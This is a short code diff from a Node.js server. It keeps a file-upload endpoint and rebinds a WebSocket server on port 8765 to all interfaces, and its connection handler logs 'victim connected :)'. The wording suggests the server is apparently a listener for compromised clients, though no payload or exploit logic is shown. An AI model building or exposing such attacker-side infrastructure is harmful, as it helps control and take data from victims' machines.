@@ -68,7 +68,10 @@ app.post("/upload", upload.array("files"), (req, res) => {
   });
 });
 app.listen(PORT,'0.0.0.0',()=>console.log(`Server running at: http://0.0.0.0:${PORT}`));
-const wss = new WebSocket.Server({ port: 8765 });
+const wss = new WebSocket.Server({  
+   host: '0.0.0.0',
+  port: 8765  
+});
 wss.on('connection', ws => {
   console.log('victim connected :)');
   ws.on('message', message => {
